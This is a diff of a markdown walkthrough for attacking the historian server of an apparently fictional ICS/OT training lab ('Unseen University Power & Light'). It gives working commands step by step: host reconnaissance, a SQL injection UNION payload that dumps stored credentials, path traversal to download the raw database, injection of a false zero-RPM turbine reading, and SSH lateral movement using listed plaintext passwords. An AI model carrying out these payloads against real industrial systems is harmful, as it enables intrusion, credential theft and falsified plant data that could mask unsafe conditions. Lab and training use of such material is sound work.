@@ -20,19 +20,19 @@ are in hand.
 ## Identity and host reconnaissance
 
 ```powershell
-whoami
+PS C:\Users\hist_admin> whoami
 ```
 
 Returns `ot.local\hist_admin`.
 
 ```powershell
-hostname
+PS C:\Users\hist_admin> hostname
 ```
 
 Returns `HIST-SRV01`.
 
 ```powershell
-ipconfig
+PS C:\Users\hist_admin> ipconfig
 ```
 
 Single NIC at `10.10.2.10`. Operational zone only. No direct control-zone path,
@@ -40,17 +40,17 @@ but the historian data comes from the engineering workstation's poll-and-ingest
 cron, which talks to the PLC directly.
 
 ```powershell
-netstat -ano
+PS C:\Users\hist_admin> netstat -ano
 ```
 
-Port 8080 (Flask web interface) and port 22 (sshd). Inbound connections from
-`10.10.2.30` (engineering workstation cron ingest) appear in the socket table
-roughly every minute.
+Port 8080 (Flask web interface) and port 22 (sshd) listening. The engineering
+workstation's ingest cron connects and closes in under a second each minute, so
+it is gone before a manual netstat lands.
 
 ## Configuration file
 
 ```powershell
-cat C:\Historian\Config\historian.ini
+PS C:\Users\hist_admin> cat C:\Historian\Config\historian.ini
 ```
 
 One file, everything in it:
@@ -64,7 +64,7 @@ One file, everything in it:
   `HEX-2291, never filed`.
 
 ```powershell
-cat C:\Historian\Config\data_sources.xml
+PS C:\Users\hist_admin> cat C:\Historian\Config\data_sources.xml
 ```
 
 The RTU data source configuration. Lists every PLC feed: IP, port, tag names,
@@ -75,7 +75,7 @@ collecting and which PLCs are reachable from this zone.
 ## Database discovery
 
 ```powershell
-cat C:\Historian\Data\README.txt
+PS C:\Users\hist_admin> cat C:\Historian\Data\README.txt
 ```
 
 Documents the SQLite database location and notes the path traversal directly:
@@ -83,7 +83,7 @@ Documents the SQLite database location and notes the path traversal directly:
 file. The README was written for the operator and doubles as an attacker guide.
 
 ```powershell
-dir C:\Historian\Data\
+PS C:\Users\hist_admin> dir C:\Historian\Data\
 ```
 
 The `historian.db` file. Size indicates how long the service has been running.
@@ -91,11 +91,11 @@ A fresh lab instance has a small seed file; a long-running instance accumulates
 weeks of one-minute readings.
 
 ```powershell
-dir C:\Historian\Archive\
+PS C:\Users\hist_admin> dir C:\Historian\Archive\
 ```
 
 ```powershell
-cat C:\Historian\Archive\export_schedule.txt
+PS C:\Users\hist_admin> cat C:\Historian\Archive\export_schedule.txt
 ```
 
 The nightly export schedule. Files are served via `/export?tag=<filename>`.
@@ -107,13 +107,13 @@ The web service runs on `http://10.10.2.10:8080/`. No authentication on read
 endpoints.
 
 ```powershell
-curl -s http://10.10.2.10:8080/status
+PS C:\Users\hist_admin> curl -s http://10.10.2.10:8080/status
 ```
 
 Health check. Confirms the service is running.
 
 ```powershell
-curl -s http://10.10.2.10:8080/assets
+PS C:\Users\hist_admin> curl -s http://10.10.2.10:8080/assets
 ```
 
 Returns the list of asset names the historian knows about: `turbine_rpm`,
@@ -121,12 +121,12 @@ Returns the list of asset names the historian knows about: `turbine_rpm`,
 and so on. These are the tag names needed for `/report` queries.
 
 ```powershell
-curl -s "http://10.10.2.10:8080/report?asset=turbine_rpm&from=2024-01-01&to=2099-01-01"
+PS C:\Users\hist_admin> curl -s "http://10.10.2.10:8080/report?asset=turbine_rpm&from=2024-01-01&to=2099-01-01"
 ```
 
-Time-series data for the turbine speed sensor. Returns rows within the
-historian's 30-day rolling window; `2024-01-01` predates any lab start date.
-Useful for establishing baseline process state before injecting false readings.
+Returns CSV rows (timestamp,value,unit) within the historian's 30-day rolling
+window. `2024-01-01` predates any lab start date. Useful for establishing the
+baseline process state before injecting false readings.
 
 ### SQL injection
 
@@ -134,7 +134,7 @@ The `asset` parameter in `/report` passes unsanitised into the SQL query.
 `HEX-1847`, closed as won't-fix in 2019.
 
 ```powershell
-curl -s "http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+key,value,'x'+FROM+config--&from=0&to=9"
+PS C:\Users\hist_admin> curl -s "http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+key,value,'x'+FROM+config--&from=0&to=9"
 ```
 
 Dumps the `config` table. Returns `db_user`, `db_pass`, `ssh_user`, `ssh_pass`,
@@ -142,32 +142,19 @@ Dumps the `config` table. Returns `db_user`, `db_pass`, `ssh_user`, `ssh_pass`,
 
 ### Path traversal
 
-The `tag` parameter in `/export` is not sanitised.
+The `tag` parameter in `/export` is not sanitised. `tag=../historian.db` serves
+the raw SQLite database file. The `alarm_config` table holds trip thresholds for
+each asset, the `config` table the full credential set, and the `readings` table
+the process history.
 
-Download the database from wizzards-retreat, which has a NIC on the same /24:
-
-```
-curl "http://10.10.2.10:8080/export?tag=../historian.db" -o /tmp/loot/historian.db
-```
-
-Then query locally on wizzards-retreat (no sqlite3 CLI; Python's module works):
-
-```
-python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute('SELECT * FROM config;')]"
-python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute('SELECT * FROM alarm_config;')]"
-```
-
-Full exfil chain to unseen-gate: `books2/historian-exfil.md`.
-
-The `alarm_config` table has the trip thresholds for each asset. The `config`
-table has the full credential set. The `readings` table is the process history.
+Full exfil chain to unseen-gate: `books/operational-exfil.md`.
 
 ### Ingest poisoning
 
 The `/ingest` endpoint accepts POST with `hist_read / history2017`.
 
 ```powershell
-iwr -Uri http://10.10.2.10:8080/ingest -Method POST -ContentType "application/json" -Headers @{Authorization="Basic aGlzdF9yZWFkOmhpc3RvcnkyMDE3"} -Body '{"timestamp":"2026-05-01T00:00:00","asset":"turbine_rpm","value":0,"unit":"RPM"}'
+PS C:\Users\hist_admin> iwr -Uri http://10.10.2.10:8080/ingest -Method POST -ContentType "application/json" -Headers @{Authorization="Basic aGlzdF9yZWFkOmhpc3RvcnkyMDE3"} -Body '{"timestamp":"2026-05-01T00:00:00","asset":"turbine_rpm","value":0,"unit":"RPM"}'
 ```
 
 Injects a false zero-RPM reading. The SCADA dashboard reads from the historian
@@ -177,12 +164,12 @@ alarms on the SCADA side depending on the threshold values in `alarm_config`.
 ## PSReadLine history
 
 ```powershell
-cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+PS C:\Users\hist_admin> cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-Shows recent local queries: config file reads, direct `sqlite3` queries against
-the database, and historian web API calls. Confirms what the administrator has
-been looking at recently and which query patterns they consider routine.
+Shows recent local queries: config file reads and historian web API calls
+(`/report`, `/assets`, `/export`). Confirms what the administrator has been
+looking at recently.
 
 ## Lateral movement
 
@@ -190,10 +177,52 @@ From the historian, the direct pivot is to the engineering workstation (which
 has a path into the control zone) or to the SCADA server.
 
 ```
-ssh engineer@10.10.2.30
-ssh scada_admin@10.10.2.20
+PS C:\Users\hist_admin> ssh engineer@10.10.2.30
 ```
 
-Credentials for both are in `historian.ini` (via the config table SQLi) and in
-the engineering workstation notes. The historian itself has no control-zone
-path, but the credentials it holds open every other host in the operational zone.
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+*******************************************************************************
+*                                                                             *
+*   Unseen University Power & Light Co.                                       *
+*   ENG-WS01, Engineering Workstation (Windows 10 Enterprise LTSC)          *
+*                                                                             *
+*   WARNING: This system has direct access to ICS/OT plant equipment.        *
+*   Authorised engineers only. All activity is logged.                        *
+*   Contact: Ponder Stibbons, ext 201 / ponder.stibbons@uupl.am             *
+*                                                                             *
+*******************************************************************************
+
+PS C:\Users\engineer> exit
+```
+
+```
+PS C:\Users\hist_admin> ssh scada_admin@10.10.2.20
+```
+
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+*******************************************************************************
+*                                                                             *
+*   Unseen University Power & Light Co.                                       *
+*   SCADA-SRV01, Distribution SCADA Server (Windows Server 2016)            *
+*                                                                             *
+*   Authorised UU P&L personnel only. Usage is monitored and logged.         *
+*   Contact: Ponder Stibbons (ext 201) for access requests.                  *
+*                                                                             *
+*******************************************************************************
+
+PS C:\Users\scada_admin> exit
+```
+
+Credentials for both were found in `historian.ini` (via the config table SQLi)
+and in the engineering workstation notes: `engineer / spanner99` for the
+engineering workstation and `scada_admin / W1nd0ws@2016` for the SCADA server.
+The historian itself has no control-zone path, but the credentials it holds open
+every other host in the operational zone.
